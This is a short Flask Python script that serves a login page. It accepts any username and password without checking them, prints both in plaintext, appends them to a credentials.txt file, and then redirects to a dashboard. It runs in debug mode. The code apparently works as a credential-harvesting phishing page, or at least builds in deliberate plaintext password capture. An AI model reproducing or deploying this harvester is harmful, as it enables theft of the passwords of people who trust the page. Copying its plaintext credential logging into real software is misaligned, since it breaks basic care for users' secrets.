from flask import Flask, render_template, request, redirect, url_for
import webbrowser

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        print(f"Received username: {username}, password: {password}")  # Logs for testing
        # Save credentials to a file (Optional)
        with open("credentials.txt", "a") as f:
            f.write(f"Username: {username}, Password: {password}\n")

        return redirect(url_for('dashboard'))
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

if __name__ == '__main__':
    webbrowser.open("http://127.0.0.1:5000")
    app.run(debug=True)
